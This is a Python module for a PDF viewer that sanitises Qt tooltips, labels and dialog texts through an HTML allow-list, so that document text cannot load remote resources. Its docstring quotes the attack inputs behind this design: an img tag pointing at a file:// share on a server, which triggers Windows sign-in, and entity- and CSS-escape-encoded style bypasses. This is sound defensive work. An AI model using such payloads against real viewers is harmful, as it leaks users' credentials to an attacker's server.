"""Text from a document or a file is shown as written, never as rich text (security reviews
2026-11-25, finding 3, and 2026-11-27, finding 2).

Qt shows a tooltip, a label, or a message as rich text (HTML) whenever its first line looks like a
tag, and rich text loads the pictures it names, in a tag or in a style. A PDF whose link address
was ``http://a/<img src="file://SERVER/share/x.png">`` made Qt open that picture as soon as the
pointer rested on the link, and Windows signed in to the server to fetch it. The 1.0.9 review did
it again past a list of risky patterns: a form field's name with a style written in entities
(``background-image&#58;url&#40;…&#41;``) or CSS escapes (``backgroun\\64-image:u\\72l(…)``), and a
comment shown in Check Spelling's context line. So:

- ``escape`` / ``tip``: text from a document, made safe to show (``tip`` keeps line breaks);
- ``plain``: a label that only ever shows plain text;
- ``clean``: rich text read the way Qt would and written out again holding only what is allowed:
  plain formatting tags, no attribute that names anything to load. **An allow-list, not a list of
  patterns**: anything else (a picture, a style property not on the list, a link to a file, an
  escape, a comment) means the text isn't PlanetPDF's own formatting, and it is shown as written;
- ``TextGuard`` (one per application, ``install``): the safety net for any place that still hands
  Qt such text. Every tooltip and every label Qt would show as rich text passes ``clean``, the
  tooltip when it is shown, the label when it is first shown *and each time its text is set*
  (``QLabel.setText``, a message box's texts, a progress dialog's label).
"""

from __future__ import annotations

import html
import re
from html.parser import HTMLParser

from PySide6.QtCore import QEvent, QObject, Qt
from PySide6.QtGui import Qt as GuiQt
from PySide6.QtWidgets import (
    QAbstractItemView,
    QApplication,
    QGraphicsView,
    QLabel,
    QMenu,
    QMessageBox,
    QProgressDialog,
    QTabBar,
    QToolTip,
    QWidget,
)

# What PlanetPDF's own rich text uses, and nothing that can load anything.
TAGS = frozenset({"b", "i", "u", "s", "em", "strong", "br", "p", "div", "span", "ul", "ol", "li", "small", "big",
                  "sup", "sub", "code", "pre", "tt", "h1", "h2", "h3", "h4", "h5", "h6", "hr", "table", "tr", "td",
                  "th", "thead", "tbody", "nobr", "qt", "html", "body", "a", "font", "center", "blockquote"})
ATTRIBUTES = frozenset({"style", "align", "valign", "colspan", "rowspan", "width", "border", "cellpadding",
                        "cellspacing", "color", "size"})
STYLE = frozenset({"color", "background-color", "font-size", "font-weight", "font-style", "text-decoration",
                   "white-space", "text-align", "vertical-align", "margin", "margin-top", "margin-bottom",
                   "margin-left", "margin-right", "padding", "padding-top", "padding-bottom", "padding-left",
                   "padding-right"})
# A value: words, numbers, sizes, #colors. No parenthesis (url(…)), backslash (CSS escapes), colon,
# or slash, so a value can't name anything.
_VALUE = re.compile(r"[#A-Za-z0-9 .,%-]*")
# A link's address: the web, an email, or one of PlanetPDF's own one-word actions ("change").
_HREF = re.compile(r"(https?://[^\s\\\"'<>]*|mailto:[^\s\\\"'<>]*|[A-Za-z][A-Za-z0-9_-]*)")


class _Cleaner(HTMLParser):
    """Writes rich text out again, keeping only what is allowed, and notes anything it left out."""

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)  # (entities decoded: "&#58;" is the ":" it stands for)
        self.out: list[str] = []
        self.dropped = False

    def _attributes(self, tag: str, attrs) -> str:
        kept = []
        for name, value in attrs:
            value = value or ""
            if tag == "a" and name == "href" and _HREF.fullmatch(value.strip()):
                kept.append(f'href="{html.escape(value.strip())}"')
            elif name in ATTRIBUTES and name != "style" and _VALUE.fullmatch(value):
                kept.append(f'{name}="{html.escape(value)}"')
            elif name == "style":
                rules = []
                for rule in (r.strip() for r in value.split(";")):
                    if not rule:
                        continue
                    prop, colon, val = rule.partition(":")
                    prop, val = prop.strip().lower(), val.strip()
                    if colon and prop in STYLE and _VALUE.fullmatch(val):
                        rules.append(f"{prop}:{val}")
                    else:
                        self.dropped = True
                if rules:
                    kept.append(f'style="{html.escape("; ".join(rules))}"')
            else:
                self.dropped = True
        return "".join(" " + k for k in kept)

    def handle_starttag(self, tag, attrs):
        if tag not in TAGS:
            self.dropped = True
            return
        self.out.append(f"<{tag}{self._attributes(tag, attrs)}>")

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)

    def handle_endtag(self, tag):
        if tag in TAGS:
            self.out.append(f"</{tag}>")
        else:
            self.dropped = True

    def handle_data(self, data):
        self.out.append(html.escape(data, quote=False))

    def handle_comment(self, data):
        self.dropped = True

    def handle_decl(self, decl):
        self.dropped = True

    def handle_pi(self, data):
        self.dropped = True

    def unknown_decl(self, data):
        self.dropped = True


def clean(text: str) -> str | None:
    """``text`` as rich text holding only what is allowed, written out by us (so Qt reads exactly
    what was checked); None when it holds anything else and must be shown as written."""
    cleaner = _Cleaner()
    try:
        cleaner.feed(text)
        cleaner.close()
    except Exception:  # noqa: BLE001 (anything it can't read is not ours)
        return None
    return None if cleaner.dropped else "".join(cleaner.out)


def risky(text: object, rich: bool = False) -> bool:
    """True when Qt would show ``text`` as rich text (``rich``: the widget always does) and it holds
    anything beyond PlanetPDF's own plain formatting."""
    return isinstance(text, str) and (rich or GuiQt.mightBeRichText(text)) and clean(text) is None


def escape(text: object) -> str:
    """``text`` made safe to put into rich text (shown exactly as written)."""
    return html.escape(str(text), quote=False)


def tip(text: object) -> str:
    """A tooltip (or rich-text label) showing ``text`` exactly as written, line breaks kept."""
    text = "" if text is None else str(text)
    if "<" not in text and "&" not in text:
        return text  # (shown as plain text by Qt anyway)
    return "<p style='white-space:pre-wrap'>" + escape(text) + "</p>"


def plain(label: QLabel, text: object | None = None) -> QLabel:
    """``label`` shows only plain text (and ``text``, when given)."""
    label.setTextFormat(Qt.TextFormat.PlainText)
    if text is not None:
        label.setText(str(text))
    return label


def _tooltip_text(widget: QWidget, pos) -> str:
    """The tooltip Qt would show for a ToolTip event at ``pos`` on ``widget``."""
    parent = widget.parentWidget()
    if isinstance(parent, QGraphicsView) and widget is parent.viewport():
        for item in parent.items(pos):
            if item.toolTip():
                return item.toolTip()
        return ""
    if isinstance(parent, QAbstractItemView) and widget is parent.viewport():
        index = parent.indexAt(pos)
        value = index.data(Qt.ItemDataRole.ToolTipRole) if index.isValid() else None
        return value if isinstance(value, str) else ""
    if isinstance(widget, QTabBar):
        i = widget.tabAt(pos)
        if i >= 0 and widget.tabToolTip(i):
            return widget.tabToolTip(i)
    if isinstance(widget, QMenu):
        action = widget.actionAt(pos)
        return action.toolTip() if action is not None and widget.toolTipsVisible() else ""
    return widget.toolTip()


def _label_rich(label: QLabel, text: str) -> bool:
    form = label.textFormat()
    return form == Qt.TextFormat.RichText or (form == Qt.TextFormat.AutoText and GuiQt.mightBeRichText(text))


def _safe_label_text(label: QLabel, text: str) -> str:
    """What ``label`` may be given: its own rich text, written out clean; anything else as plain text."""
    if not isinstance(text, str) or not _label_rich(label, text):
        return text
    cleaned = clean(text)
    if cleaned is None:
        label.setTextFormat(Qt.TextFormat.PlainText)
        return text
    return cleaned


class TextGuard(QObject):
    """Application event filter: no tooltip or label loads what document text names."""

    def eventFilter(self, watched, event):  # noqa: N802 (Qt)
        kind = event.type()
        if kind == QEvent.Type.ToolTip and isinstance(watched, QWidget):
            text = _tooltip_text(watched, event.pos())
            if text and GuiQt.mightBeRichText(text):
                cleaned = clean(text)
                QToolTip.showText(event.globalPos(), tip(text) if cleaned is None else cleaned, watched)
                return True
        elif kind == QEvent.Type.Polish and isinstance(watched, QLabel):
            text = watched.text()
            if _label_rich(watched, text):
                safe = _safe_label_text(watched, text)
                if safe != text:
                    _ORIGINAL["label"](watched, safe)
        return False


_ORIGINAL: dict = {}


def _guard_setters() -> None:
    """Every QLabel.setText, a message box's texts, and a progress dialog's label go through the
    same check as a label's first showing (1.0.9 review, finding 2: Check Spelling's context line
    was set after it was first shown)."""
    if _ORIGINAL:
        return
    _ORIGINAL["label"] = QLabel.setText
    _ORIGINAL["box"] = QMessageBox.setText
    _ORIGINAL["info"] = QMessageBox.setInformativeText
    _ORIGINAL["progress"] = QProgressDialog.setLabelText

    def label_set_text(self, text):
        _ORIGINAL["label"](self, _safe_label_text(self, text))

    def box_set_text(self, text):
        if isinstance(text, str) and self.textFormat() != Qt.TextFormat.PlainText and risky(
                text, rich=self.textFormat() == Qt.TextFormat.RichText):
            self.setTextFormat(Qt.TextFormat.PlainText)
        _ORIGINAL["box"](self, text)

    def box_set_informative(self, text):
        _ORIGINAL["info"](self, tip(text) if risky(text) else text)

    def progress_set_label(self, text):
        _ORIGINAL["progress"](self, tip(text) if risky(text) else text)

    QLabel.setText = label_set_text
    QMessageBox.setText = box_set_text
    QMessageBox.setInformativeText = box_set_informative
    QProgressDialog.setLabelText = progress_set_label


def install(app: QApplication | None = None) -> None:
    """Starts guarding tooltips and labels (once per application)."""
    app = app or QApplication.instance()
    if app is None or getattr(app, "_planetpdf_text_guard", None) is not None:
        return
    guard = TextGuard(app)
    app.installEventFilter(guard)
    app._planetpdf_text_guard = guard
    _guard_setters()
